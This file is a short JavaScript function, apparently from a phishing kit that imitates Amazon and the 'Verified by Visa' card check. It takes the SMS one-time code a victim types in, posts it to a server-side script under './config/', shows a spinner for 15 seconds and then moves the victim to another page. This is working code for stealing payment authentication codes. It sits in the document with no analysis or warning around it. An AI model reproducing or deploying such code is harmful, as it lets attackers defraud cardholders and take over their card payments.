function vbv_amazon(){



				var	codesms_vbv = $("#codesms_vbv").val();
				
				
					if(codesms_vbv==''){

					swal({
			      icon: 'warning',
                 title: 'warning !',
                  text: "Please enter the code received by SMS",

					})	

					return false;	
					}

				var data_codesmsone = 
				{

				code_smsone		    :	$("#codesms_vbv").val()

				};
			  

var _url = './config/codesms_one.php';
$('#cover-spin').show(0);
$.post(_url,data_codesmsone,function(data){
 var reponse = JSON.parse(data); 


/* console.log('data=>'+data); */
if(reponse.statut=="error"){	
 $('#cover-spin').hide();
swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	
setTimeout(function(){ 
   /* $('#cover-spin').hide();*/
    window.location="codesmssends.html";
    
}, 15000);


} 


});

	
}
